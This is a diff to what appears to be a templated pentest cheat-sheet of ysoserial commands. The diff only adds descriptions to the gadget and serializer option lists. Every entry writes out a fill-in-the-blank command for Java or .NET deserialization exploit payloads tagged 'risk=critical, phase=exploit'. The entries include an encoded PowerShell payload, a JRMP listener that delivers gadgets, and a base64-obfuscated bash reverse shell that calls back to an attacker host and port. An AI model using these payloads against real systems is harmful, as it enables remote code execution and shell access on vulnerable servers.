@@ -21,7 +21,7 @@ java -jar ysoserial.jar
 Generate a CommonsCollections Java payload that runs a command.
 
 ```bash
-java -jar ysoserial.jar {{GADGET:choice:CommonsCollections1,CommonsCollections2,CommonsCollections3,CommonsCollections4,CommonsCollections5,CommonsCollections6,CommonsCollections7,Spring1,Spring2,Groovy1,Hibernate1,ROME,JRMPClient,URLDNS}} "{{CMD:str:id}}" > {{OUTFILE:file:payload.bin}}
+java -jar ysoserial.jar {{GADGET:choice:CommonsCollections1=CC <3.2.1,CommonsCollections2=CC4 InvokerTransformer,CommonsCollections3=CC + TemplatesImpl,CommonsCollections4=CC4 + TemplatesImpl,CommonsCollections5=CC BadAttributeValue,CommonsCollections6=CC HashSet variant,CommonsCollections7=CC Hashtable variant,Spring1=Spring beans <4.0,Spring2=Spring AOP variant,Groovy1=Groovy <2.4.4,Hibernate1=Hibernate JNDI,ROME=ROME feed reader,JRMPClient=JRMP callback,URLDNS=blind DNS detection}} "{{CMD:str:id}}" > {{OUTFILE:file:payload.bin}}
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=java,commonscollections,rce -->
@@ -32,7 +32,7 @@ java -jar ysoserial.jar {{GADGET:choice:CommonsCollections1,CommonsCollections2,
 Generate a Java payload that runs an encoded PowerShell command.
 
 ```bash
-java -jar ysoserial.jar {{GADGET:choice:CommonsCollections1,CommonsCollections2,CommonsCollections3,CommonsCollections4,CommonsCollections5,CommonsCollections6,CommonsCollections7,Spring1,Spring2,Groovy1,Hibernate1,ROME,JRMPClient,URLDNS}} "powershell.exe -EncodedCommand {{B64CMD:str:BASE64}}" > {{OUTFILE:file:payload.bin}}
+java -jar ysoserial.jar {{GADGET:choice:CommonsCollections1=CC <3.2.1,CommonsCollections2=CC4 InvokerTransformer,CommonsCollections3=CC + TemplatesImpl,CommonsCollections4=CC4 + TemplatesImpl,CommonsCollections5=CC BadAttributeValue,CommonsCollections6=CC HashSet variant,CommonsCollections7=CC Hashtable variant,Spring1=Spring beans <4.0,Spring2=Spring AOP variant,Groovy1=Groovy <2.4.4,Hibernate1=Hibernate JNDI,ROME=ROME feed reader,JRMPClient=JRMP callback,URLDNS=blind DNS detection}} "powershell.exe -EncodedCommand {{B64CMD:str:BASE64}}" > {{OUTFILE:file:payload.bin}}
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=java,powershell,windows,rce -->
@@ -54,7 +54,7 @@ iconv -f ASCII -t UTF-16LE {{SCRIPT_FILE:file:payload.ps1}} | base64 | tr -d "\n
 Generate a Java gadget payload that spawns a reverse shell via bash.
 
 ```bash
-java -jar ysoserial.jar {{GADGET:choice:CommonsCollections5,CommonsCollections1,CommonsCollections2,CommonsCollections3,CommonsCollections4,CommonsCollections6,CommonsCollections7,Spring1,Spring2,Groovy1,Hibernate1,ROME,JRMPClient,URLDNS}} 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC97e0xIT1NUOmlwOjEwLjAuMC4xfX0ve3tMUE9SVDpwb3J0OjQ0NDR9fSAwPiYx}|{base64,-d}|{bash,-i}' > {{OUTFILE:file:revshell.bin}}
+java -jar ysoserial.jar {{GADGET:choice:CommonsCollections5=CC BadAttributeValue,CommonsCollections1=CC <3.2.1,CommonsCollections2=CC4 InvokerTransformer,CommonsCollections3=CC + TemplatesImpl,CommonsCollections4=CC4 + TemplatesImpl,CommonsCollections6=CC HashSet variant,CommonsCollections7=CC Hashtable variant,Spring1=Spring beans <4.0,Spring2=Spring AOP variant,Groovy1=Groovy <2.4.4,Hibernate1=Hibernate JNDI,ROME=ROME feed reader,JRMPClient=JRMP callback,URLDNS=blind DNS detection}} 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC97e0xIT1NUOmlwOjEwLjAuMC4xfX0ve3tMUE9SVDpwb3J0OjQ0NDR9fSAwPiYx}|{base64,-d}|{bash,-i}' > {{OUTFILE:file:revshell.bin}}
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=java,reverseshell,rce -->
@@ -65,7 +65,7 @@ java -jar ysoserial.jar {{GADGET:choice:CommonsCollections5,CommonsCollections1,
 Generate a Java payload and base64-encode it for embedding in HTTP requests.
 
 ```bash
-java -jar ysoserial.jar {{GADGET:choice:CommonsCollections6,CommonsCollections1,CommonsCollections2,CommonsCollections3,CommonsCollections4,CommonsCollections5,CommonsCollections7,Spring1,Spring2,Groovy1,Hibernate1,ROME,JRMPClient,URLDNS}} "{{CMD:str:id}}" | base64 -w0
+java -jar ysoserial.jar {{GADGET:choice:CommonsCollections6=CC HashSet variant,CommonsCollections1=CC <3.2.1,CommonsCollections2=CC4 InvokerTransformer,CommonsCollections3=CC + TemplatesImpl,CommonsCollections4=CC4 + TemplatesImpl,CommonsCollections5=CC BadAttributeValue,CommonsCollections7=CC Hashtable variant,Spring1=Spring beans <4.0,Spring2=Spring AOP variant,Groovy1=Groovy <2.4.4,Hibernate1=Hibernate JNDI,ROME=ROME feed reader,JRMPClient=JRMP callback,URLDNS=blind DNS detection}} "{{CMD:str:id}}" | base64 -w0
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=java,base64,http -->
@@ -98,7 +98,7 @@ java -jar ysoserial.jar JRMPClient "{{LHOST:ip:10.0.0.1}}:{{LPORT:port:1099}}" >
 Run ysoserial's JRMP listener to deliver a gadget to a connecting JRMPClient.
 
 ```bash
-java -cp ysoserial.jar ysoserial.exploit.JRMPListener {{LPORT:port:1099}} {{GADGET:choice:CommonsCollections1,CommonsCollections2,CommonsCollections3,CommonsCollections4,CommonsCollections5,CommonsCollections6,CommonsCollections7,Spring1,Spring2,Groovy1,Hibernate1,ROME,JRMPClient,URLDNS}} "{{CMD:str:id}}"
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener {{LPORT:port:1099}} {{GADGET:choice:CommonsCollections1=CC <3.2.1,CommonsCollections2=CC4 InvokerTransformer,CommonsCollections3=CC + TemplatesImpl,CommonsCollections4=CC4 + TemplatesImpl,CommonsCollections5=CC BadAttributeValue,CommonsCollections6=CC HashSet variant,CommonsCollections7=CC Hashtable variant,Spring1=Spring beans <4.0,Spring2=Spring AOP variant,Groovy1=Groovy <2.4.4,Hibernate1=Hibernate JNDI,ROME=ROME feed reader,JRMPClient=JRMP callback,URLDNS=blind DNS detection}} "{{CMD:str:id}}"
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=java,jrmp,listener -->
@@ -120,7 +120,7 @@ ysoserial.exe --fullhelp
 Generate a Json.Net ObjectDataProvider .NET payload that runs a command.
 
 ```bash
-ysoserial.exe -f {{FORMATTER:choice:Json.Net,BinaryFormatter,DataContractSerializer,DataContractJsonSerializer,JavaScriptSerializer,LosFormatter,NetDataContractSerializer,ObjectStateFormatter,SoapFormatter,XmlSerializer,FastJson}} -g {{GADGET:choice:ObjectDataProvider,TypeConfuseDelegate,WindowsIdentity,PSObject,RolePrincipal,ClaimsIdentity,DataSet,TextFormattingRunProperties,ActivitySurrogateSelector,SessionSecurityToken,XamlAssemblyLoadFromFile}} -o raw -c "{{CMD:str:calc.exe}}" -t
+ysoserial.exe -f {{FORMATTER:choice:Json.Net=Newtonsoft JSON,BinaryFormatter=classic .NET binary,DataContractSerializer=WCF XML,DataContractJsonSerializer=WCF JSON,JavaScriptSerializer=ASP.NET AJAX,LosFormatter=ASP.NET viewstate,NetDataContractSerializer=.NET remoting XML,ObjectStateFormatter=viewstate binary,SoapFormatter=SOAP XML,XmlSerializer=XML serializer,FastJson=FastJson library}} -g {{GADGET:choice:ObjectDataProvider=WPF ObjectDataProvider,TypeConfuseDelegate=delegate type confusion,WindowsIdentity=Windows token gadget,PSObject=PowerShell object gadget,RolePrincipal=role principal gadget,ClaimsIdentity=claims identity gadget,DataSet=DataSet XML gadget,TextFormattingRunProperties=WPF text runs,ActivitySurrogateSelector=WF activity surrogate,SessionSecurityToken=session token gadget,XamlAssemblyLoadFromFile=XAML file load}} -o raw -c "{{CMD:str:calc.exe}}" -t
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=dotnet,json.net,objectdataprovider,rce -->
